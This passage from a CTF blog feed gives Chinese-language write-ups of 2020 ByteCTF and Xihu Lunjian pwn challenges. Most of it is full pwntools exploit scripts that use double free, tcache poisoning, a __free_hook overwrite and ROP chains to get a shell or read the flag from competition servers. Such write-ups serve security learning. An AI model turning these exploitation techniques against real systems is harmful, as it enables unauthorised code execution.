class="number">4</span>+p64(heap+<span class="number">0x20</span>)+<span class="string">'a'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;pwn-printf&quot;&gt;&lt;a href=&quot;#pwn-printf&quot; class=&quot;headerlink&quot; title=&quot;p
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020bytectf-WP</title>
    <link href="https://nuoye-blog.github.io/2020/10/25/6ff766d/"/>
    <id>https://nuoye-blog.github.io/2020/10/25/6ff766d/</id>
    <published>2020-10-25T14:00:00.000Z</published>
    <updated>2020-10-26T05:22:08.446Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h3><p>实现了单向的操作，buy是获取堆块，load是将堆块填入，shoot是输出堆块的信息，并进行free。</p><p>首先是leak的，直接unsortbin即可leak出libc地址。</p><p>接着由于shoot的时候没有对对链表清空，所以可以先申请9个fastbin范围的堆块，倒序load再shoot，接着再申请回7个，再将第一个载入，再进行shoot，就会将原本已经在fastbin的堆块再次free，得到double free。接着再将tcache中的7个堆块申请回来，再申请一个即可发现tcache中又存在了3个tcache，并且构成了循环，这样即可达到任意地址申请的目的。</p><p>接着第一步先申请到stdout中，进行修改write的指针到<code>environ</code>附近，从而leak出栈地址。</p><p>接着第二步将地址申请到栈上，劫持返回地址，修改rsp到堆上步骤好的rop串进行orw。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./gun"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.31.so"</span>&#125;)</span><br><span class="line">p = remote(<span class="string">"123.57.209.176"</span>,<span class="string">"30772"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shoot</span><span class="params">(times)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Action&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Shoot time: "</span>)</span><br><span class="line">p.sendline(str(times))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Action&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Which one do you want to load?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Action&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Bullet price:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Bullet Name: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your name: "</span>)</span><br><span class="line">p.sendline(<span class="string">"aaa"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">buy(<span class="number">0x88</span>,<span class="string">'1111\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">load(<span class="number">8</span>-i)</span><br><span class="line">shoot(<span class="number">9</span>)</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Pwn! The "</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00\x00'</span>)<span class="number">-0x1EBBE0</span></span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment">#io leak stack</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Pwn! The "</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Pwn! The "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00\x00'</span>)<span class="number">-0x770</span> <span class="number">-0x50</span></span><br><span class="line">print(hex(heap))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x38</span>,p64(libc.sym[<span class="string">'_IO_2_1_stdout_'</span>])+<span class="string">b'\n'</span>)</span><br><span class="line">print(hex(libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]))</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x38</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.sym[<span class="string">'environ'</span>])+p64(libc.sym[<span class="string">'environ'</span>]+<span class="number">8</span>)+p64(libc.sym[<span class="string">'environ'</span>]+<span class="number">8</span>)+<span class="string">b'\n'</span>)<span class="comment">#write1</span></span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00\x00'</span>)</span><br><span class="line">print(hex(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rsp = <span class="number">0x0000000000032b5a</span> + libc.address</span><br><span class="line">pop_rdi = <span class="number">0x0000000000026b72</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x0000000000027529</span> + libc.address</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011c371</span> + libc.address</span><br><span class="line">pop_rax = <span class="number">0x000000000004a550</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x0000000000122F29</span> + libc.address</span><br><span class="line">ROP1 = p64(pop_rsp)</span><br><span class="line">ROP1 += p64(heap+<span class="number">0xa60</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'flag\x00'</span>.ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap+<span class="number">0xa60</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0xa60</span>+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0xa60</span>+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">buy(<span class="number">0x18</span>,<span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">buy(<span class="number">0x18</span>,<span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">buy(<span class="number">0x18</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x18</span>,p64(stack<span class="number">-0x100</span>)+<span class="string">b'\n'</span>)</span><br><span class="line">buy(<span class="number">0x18</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x18</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x18</span>,ROP1+<span class="string">b'\n'</span>)</span><br><span class="line">load(<span class="number">2</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">buy(<span class="number">0x200</span>,payload+<span class="string">b'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x1B69)')</span></span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Goodbye!"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h3><p>程序存在逻辑漏洞：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20201025212841.png" alt="image-20201025212841046"></p><p>第一次输入不符合要求的size后也会作为后面写入null字节的偏移量，通过这一漏洞可以修改一个free状态的fd，再在fd对应地址处输入值即可劫持fd，从而申请到任意地址。</p><p>首先通过0x80堆块进行leak，得到libc地址。接着用上述漏洞申请到<code>__free_hook</code>，再将其修改为system，即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./easyheap"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.31.so"</span>&#125;)</span><br><span class="line">p = remote(<span class="string">"123.57.209.176"</span>,<span class="string">"30774"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">-4</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add3</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x91</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(<span class="number">7</span>-i)</span><br><span class="line">add2(<span class="number">1</span>,<span class="string">'1'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00\x00'</span>)<span class="number">-0x1EBC31</span></span><br><span class="line">print(hex(libc.address))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">add(<span class="number">0x80</span>,p64(libc.sym[<span class="string">'__free_hook'</span>])+<span class="string">b'\n'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add3(<span class="number">0x80</span>,<span class="string">'1\n'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'/bin/sh\x00\n'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(libc.sym[<span class="string">'system'</span>])+<span class="string">b'\n'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x1537)\nb system')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;gun&quot;&gt;&lt;a href=&quot;#gun&quot; class=&quot;headerlink&quot; title=&quot;gun&quot;&gt;&lt;/a&gt;gun&lt;/h
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020西湖论剑线上初赛-WP</title>
    <link href="https://nuoye-blog.github.io/2020/10/25/e669e7b9/"/>
    <id>https://nuoye-blog.github.io/2020/10/25/e669e7b9/</id>
    <published>2020-10-25T14:00:00.000Z</published>
    <updated>2020-10-25T13:58:02.327Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h3><p>最开始会给出栈地址，存在uaf漏洞，并且这里存在栈漏洞：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20201025210657.png" alt="image-20201025210650080"></p><p>可以泄漏出canary。</p><p>利用uaf申请到栈上，即可劫持返回地址进行rop操作，leak出libc的地址即可用system进行getshell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./mmutag"</span>)</span><br><span class="line">p = remote(<span class="string">"183.129.189.62"</span>,<span class="number">60104</span>)</span><br><span class="line">libc = ELF(<span class="string">"mmutag"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_i</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"please input your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input your introduce '</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choise:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input your id:'</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'input your content'</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choise:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input your id:'</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choise:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit1</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choise:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"please input you name:"</span>)</span><br><span class="line">p.send(<span class="string">"aaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"please input your choice:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="string">'b'</span>*<span class="number">0x19</span>)</span><br><span class="line">p.recvuntil(<span class="string">"b"</span>*<span class="number">0x18</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>))<span class="number">-0x62</span></span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line">show(p64(<span class="number">0</span>)+p64(<span class="number">0x7f</span>)+p64(<span class="number">0</span>)+p64(canary))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,p64(stack <span class="number">-0x40</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">puts_plt = <span class="number">0x4006B0</span></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400d23</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400d21</span></span><br><span class="line">read_plt = <span class="number">0x4006F0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x400D1A</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(stack+<span class="number">0x28</span>)</span><br><span class="line">payload += p64(<span class="number">0x200</span>)</span><br><span class="line">payload += p64(stack +<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x400D00</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line">add(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exit1()</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x400D1A</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(stack+<span class="number">0x78</span>)</span><br><span class="line">payload += p64(<span class="number">0x200</span>)</span><br><span class="line">payload += p64(stack+<span class="number">0x70</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x400D00</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b 